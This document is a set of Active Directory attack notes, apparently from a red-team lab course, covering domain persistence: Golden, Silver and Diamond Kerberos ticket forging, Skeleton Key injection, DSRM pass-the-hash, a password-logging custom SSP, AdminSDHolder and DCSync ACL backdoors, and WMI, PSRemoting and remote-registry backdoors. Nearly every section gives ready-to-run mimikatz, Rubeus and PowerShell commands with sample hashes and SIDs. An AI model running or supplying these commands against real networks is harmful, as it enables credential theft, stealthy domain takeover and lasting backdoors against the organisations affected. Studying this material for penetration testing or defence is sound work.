
#### Golden Ticket

• A golden ticket is signed and encrypted by the hash of krbtgt
account which makes it a valid TGT ticket.
• The krbtgt user hash could be used to impersonate any user with
any privileges from even a non-domain machine.
• Single password change has no effect on this attack as password
history is maintained for the account.

Execute mimikatz or any of its variant on DC to get krbtgt hash

```
SafetyKatz.exe '"lsadump::lsa /patch"'
Or
SafetyKatz.exe '"lsadump::dcsync /user:us\krbtgt"'
```

On a machine which can reach the DC over network:

```
SafetyKatz.exe '"kerberos::golden /User:Administrator
/domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-
163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0
/endin:600 /renewmax:10080 /ptt"'
```

Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:

```
C:\AD\Tools\Rubeus.exe golden
/aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58c
acd5 /sid:S-1-5-21-210670787-2521448726-163245708 /ldap
/user:Administrator /printcmd
```

• Above command generates the ticket forging command. Note that 3 LDAP queries
are sent to the DC to retrieve the values:
     – To retrieve flags for user specified in /user.
     – To retrieve /groups, /pgid, /minpassage and /maxpassage
     – To retrieve /netbios of the current domain
• If you have already enumerated the above values, manually specify as many you can
in the forging command (a bit more opsec friendly).


The Golden ticket forging command looks like this:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn%
/aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5
/user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-
21-210670787-2521448726-163245708 /pwdlastset:"7/5/2019 12:42:09 AM"
/minpassage:1 /logoncount:252 /netbios:US /groups:544,512,520,513 /dc:US-
DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

| Option             | Description |
|--------------------|-------------|
| **golden**        | Name of the module |
| **/aes256**:5e3d2096abb01469a3b0350962b0c65cedb | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent. |
| **/user**:Administrator | Username for which the TGT is generated |
| **/id**:500 | User RID (retrieved from the DC) (Default 500) |
| **/pgid**:513 | Primary Group ID (retrieved from the DC) (Default 513) |
| **/groups**:544,512,520,513 | Groups the user is a member of (retrieved from the DC) (Default 520,512,513,519,518) |
| **/domain**:us.techcorp.local | FQDN of the domain (retrieved from the DC) |
| **/sid**:S-1-5-21-210670787-2521448726-163245708 | SID of the current domain |
| **/pwdlastset**:"7/5/2019 12:42:09 AM" | The PasswordLastSet for the user (retrieved from the DC) |
| **/minpassage**:1 | “Minimum Password Age” in days (retrieved from the DC) |
| **/logoncount**:2453 | Logon Count for the user (retrieved from the DC) |
| **/netbios**:us | NetBIOS name of the domain (retrieved from the DC) |
| **/dc**:us-dc.us.techcorp.local | FQDN of the DC (retrieved from the DC) |
| **/uac**:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD | UserAccountControl Flags (retrieved from the DC) |
| **/ptt** | Inject in the current process |

#### Silver Ticket

• A valid TGS (Golden ticket is TGT).
• Encrypted and Signed by the NTLM hash of the service account (Golden
ticket is signed by hash of krbtgt) of the service running with that
account.
• Services rarely check PAC (Privileged Attribute Certificate).
• Services will allow access only to the services themselves.
• Reasonable persistence period (default 30 days for computer accounts).


Using hash of the Domain Controller computer account, below command provides
access to shares on the DC.

```
SafetyKatz.exe '"kerberos::golden /User:Administrator
/domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-
163245708 /target:us-dc.us.techcorp.local /service:cifs
/rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512
/startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```


Forge a Silver ticket. :

```
C:\AD\Tools\Rubeus.exe silver /service:http/us-dc.us.techcorp.local
/rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-
2521448726-163245708 /user:Administrator /domain:us.techcorp.local
/ptt
```

Just like the Golden ticket, /ldap option queries DC for information related to the
user.

#### Diamond Ticket

A diamond ticket is created by decrypting a valid TGT, making changes to
it and re-encrypt it using the AES keys of the krbtgt account.
• Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT
modification attack.
• Once again, the persistence lifetime depends on krbtgt account.
• A diamond ticket is more opsec safe as it has:
	– Valid ticket times because a TGT issued by the DC is modified
	– In golden ticket, there is no corresponding TGT request for
TGS/Service ticket requests as the TGT is forged.


We would still need krbtgt AES keys. Use the following Rubeus command to
create a diamond ticket (note that RC4 or AES keys of the user can be used
too):

```
Rubeus.exe diamond
/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
/user:studentuserx /password:studentuserxpassword /enctype:aes
/ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt
```

We could also use /tgtdeleg option in place of credentials in case we have
access as a domain user:

```
Rubeus.exe diamond
/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
/tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Skeleton Key


• Skeleton key is a persistence technique where it is possible to patch a
Domain Controller (lsass process) so that it allows access as any user with
a single password.
• The attack was discovered by Dell Secureworks used in a malware named
the Skeleton Key malware.
• All the publicly known methods are NOT persistent across reboots.
• Yet again, mimikatz to the rescue.


Use the below command to inject a skeleton key (password would be
mimikatz) on a Domain Controller of choice. DA privileges required

```
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -
ComputerName us-dc
```

Now, it is possible to access any machine with a valid username and
password as "mimikatz"

```
Enter-PSSession –Computername us-dc –credential
us\Administrator
```


You can access other machines as well as long as they authenticate with
the DC which has been patched and the DC is not rebooted.


• In case lsass is running as a protected process, we can still use Skeleton
Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target
DC:
~~~
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
~~~

• Note that above would be very noisy in logs - Service creation!


####   Directory Services Restore Mode (DSRM)

• DSRM is Directory Services Restore Mode.
• There is a local administrator on every DC called "Administrator" whose
password is the DSRM password.
• DSRM password (SafeModePassword) is saved when a server is
promoted to Domain Controller and it is rarely changed.
• After altering the configuration on the DC, it is possible to pass the
NTLM hash of this user to access the DC.


Dump DSRM password (needs DA privs)

```
Invoke-Mimikatz -Command '"token::elevate"
"lsadump::sam"' -Computername us-dc
```


```
SafetyKatz.exe '"token::elevate" "lsadump::sam"'
```

Compare the Administrator hash with the Administrator hash of below
command

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -
Computername us-dc
```

```
SafetyKatz.exe '"lsadump::lsa /patch"'
```

First one is the DSRM local Administrator.

Since it is the 'local' administrator of the DC, we can pass the hash to
authenticate.

But, the Logon Behavior for the DSRM account needs to be changed
before we can use its hash

```
Enter-PSSession -Computername us-dc
New-ItemProperty
"HKLM:\System\CurrentControlSet\Control\Lsa\" -Name
"DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Use below command to pass the hash

```
SafetyKatz.exe '"sekurlsa::pth /domain:us-dc
/user:Administrator
/ntlm:917ecdd1b4287f7051542d0241900cf0
/run:powershell.exe"'
ls \\us-dc\C$
```

To use PSRemoting, we must force NTLM authentication:

```
Enter-PSSession -ComputerName us-dc -Authentication
Negotiate
```


#### Custom SSP

A Security Support Provider (SSP) is a DLL which provides ways for an application to
obtain an authenticated connection. Some SSP Packages by Microsoft are
– NTLM
– Kerberos
– Wdigest
– CredSSP
• Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service
account and machine account passwords in clear text on the target server.

• We can use either of the ways:
– Drop the mimilib.dll to system32 and add mimilib to
~~~
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
~~~

~~~
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -
Name 'Security Packages' -Value $packages
~~~

~~~
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
~~~


– Using mimikatz, inject into lsass (Not stable with Server 2016 and 2019):

~~~
SafetyKatz.exe '"misc::memssp"'
~~~

#### ACLs – AdminSDHolder

• Resides in the System container of a domain and used to control the
permissions - using an ACL - for certain built-in privileged groups (
called Protected Groups).
• Security Descriptor Propagator (SDPROP) runs every hour and compares
the ACL of protected groups and members with the ACL of
AdminSDHolder and any differences are overwritten on the object ACL.

| Account Operators | Enterprise Admins |
|-------------------|------------------|
| Backup Operators | Domain Controllers |
| Server Operators | Read-only Domain Controllers |
| Print Operators  | Schema Admins |
| Domain Admins    | Administrators |
| Replicator      | |
Well known abuse of some of the Protected Groups - All of the below
can log on locally to DC

| Group Name         | Privileges / Actions |
|--------------------|---------------------------------------------------------------|
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested groups within these groups. |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group, and restore. |
| Server Operators  | Run a command as SYSTEM (using the disabled Browser service). |
| Print Operators   | Copy `ntds.dit` backup, load device drivers. |

• With DA privileges (Full Control/Write permissions) on the
AdminSDHolder object, it can be used as a backdoor/persistence
mechanism by adding a user with Full Permissions (or other interesting
permissions) to the AdminSDHolder object.
• In 60 minutes (when SDPROP runs), the user will be added with Full
Control to the AC of groups like Domain Admins without actually being a
member of it.


Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:

```
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity
studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain
us.techcorp.local -Verbose
```

Using ActiveDirectory Module and RACE toolkit:

(https://github.com/samratashok/RACE) 

```
Set-DCPermissions -Method AdminSDHolder -SAMAccountName studentuser1 -Right
GenericAll -DistinguishedName
'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -Verbose
```

Other interesting permissions (ResetPassword, WriteMembers) for a user to the
AdminSDHolder:

```
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -
PrincipalIdentity studentuser1 -Rights ResetPassword -
PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -
Verbose
```


```
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -
PrincipalIdentity studentuser1 -Rights WriteMembers -PrincipalDomain
us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

Run SDProp manually using Invoke-SDPropagator.ps1 from Tools
directory:

```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -
Verbose
```

For pre-Server 2008 machines:

```
Invoke-SDPropagator -taskname FixUpInheritance -
timeoutMinutes 1 -showProgress -Verbose
```

Check the Domain Admins permission - PowerView as normal user:

```
Get-DomainObjectAcl -Identity 'Domain Admins' -
ResolveGUIDs | ForEach-Object {$_ | Add-Member
NoteProperty 'IdentityName' $(Convert-SidToName
$_.SecurityIdentifier);$_} | ?{$_.IdentityName -match
"studentuser1"}
```

Using ActiveDirectory Module:

```
(Get-Acl -Path 'AD:\CN=Domain
Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access |
?{$_.IdentityReference -match 'studentuser1'}
```

Abusing FullControl using PowerView:

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members
testda -Verbose
```

Using ActiveDirectory Module:

```
Add-ADGroupMember -Identity 'Domain Admins' -Members
testda
```

Abusing ResetPassword using PowerView:

```
Set-DomainUserPassword -Identity testda -AccountPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -
Force) -Verbose
```

Using ActiveDirectory Module:

```
Set-ADAccountPassword -Identity testda -NewPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -
Force) -Verbose
```

#### ACLs – Rights Abuse

• There are even more interesting ACLs which can be abused.
• For example, with DA privileges, the ACL for the domain root can be
modified to provide useful rights like FullControl or the ability to run
"DCSync".

Add FullControl rights:

```
Add-DomainObjectAcl -TargetIdentity
"dc=us,dc=techcorp,dc=local" -PrincipalIdentity
studentuser1 -Rights All -PrincipalDomain
us.techcorp.local -TargetDomain us.techcorp.local -
Verbose
```

Using ActiveDirectory Module and RACE:

```
Set-ADACL -SamAccountName studentuser1 -
DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right
GenericAll -Verbose
```

Add rights for DCSync:

```
Add-DomainObjectAcl -TargetIdentity
"dc=us,dc=techcorp,dc=local" -PrincipalIdentity
studentuser1 -Rights DCSync -PrincipalDomain
us.techcorp.local -TargetDomain us.techcorp.local -
Verbose
```

Using ActiveDirectory Module and RACE:

```
Set-ADACL -SamAccountName studentuser1 -
DistinguishedName 'DC=us,DC=techcorp,DC=local' -
GUIDRight DCSync -Verbose
```

Execute DCSync:

```
Invoke-Mimikatz -Command '"lsadump::dcsync
/user:us\krbtgt"'
```

or 

```
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```


#### ACLs – Security Descriptors

• It is possible to modify Security Descriptors (security information like
Owner, primary group, DACL and SACL) of multiple remote access
methods (securable objects) to allow access to non-admin users.
• Administrative privileges are required for this.
• It, of course, works as a very useful and impactful backdoor mechanism.


Security Descriptor Definition Language defines the format which is used to describe
a security descriptor. SDDL uses ACE strings for DACL and SACL:

~~~
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_si
d
~~~

• ACE for built-in administrators for WMI namespaces

~~~
A;CI;CCDCLCSWRPWPRCWD;;;SID
~~~

##### Security Descriptors - WMI

ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:

```
. C:\AD\Tools\RACE-master\RACE.ps1
```

On local machine for student1:

```
Set-RemoteWMI -SamAccountName studentuser1 –Verbose
```

On remote machine for studentuser1 without explicit credentials:

```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Verbose
```


On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:

```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -
Credential Administrator –namespace 'root\cimv2' -Verbose
```

On remote machine remove permissions:

```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
```

##### Security Descriptors -PowerShell Remoting

Using the RACE toolkit
On local machine for studentuser1:

```
Set-RemotePSRemoting -SamAccountName studentuser1 –Verbose
```

On remote machine for studentuser1 without credentials:

```
Set-RemotePSRemoting -SamAccountName studentuser1 -
ComputerName us-dc -Verbose
```

On remote machine, remove the permissions:

```
Set-RemotePSRemoting -SamAccountName studentuser1 -
ComputerName us-dc -Remove
```


##### Security Descriptors -Remote Registry

Using RACE or DAMP toolkit, with admin privs on remote machine

```
Add-RemoteRegBackdoor -ComputerName us-dc -Trustee
studentuser1 -Verbose
```

As studentuser1, retrieve machine account hash:

```
Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose
```

Retrieve local account hash:

```
Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose
```

Retrieve domain cached credentials:

```
Get-RemoteCachedCredential -ComputerName us-dc -Verbose
```


